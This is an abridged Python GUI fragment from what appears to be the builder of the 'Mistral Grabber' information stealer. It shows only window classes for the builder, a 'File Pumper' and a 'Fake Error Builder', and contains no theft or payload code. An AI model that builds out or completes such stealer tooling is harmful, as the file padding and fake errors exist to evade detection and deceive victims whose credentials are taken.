...
class PumperSettings(ctk.CTkToplevel):
	...
	def __init__(self, master) -> None:
		...
		self.title("Mistral Grabber [File Pumper]")
...
class FakeErrorBuilder(ctk.CTkToplevel):
	...
	def __init__(self, master) -> None:
		super().__init__(master)
		self.title("Mistral Grabber [Fake Error Builder]")
		self.after(200, lambda: self.iconbitmap(os.path.join("Extras", "icon.ico")))
		self.grab_set()
...
class Builder(ctk.CTk):
	...
	def __init__(self) -> None:
		...
		self.title("Mistral Grabber [Builder]")
		...
		self.titleLabel = ctk.CTkLabel(self, text= "Mistral Grabber", font= ctk.CTkFont(size= 68, weight= "bold"), text_color= "#1cc7c7")
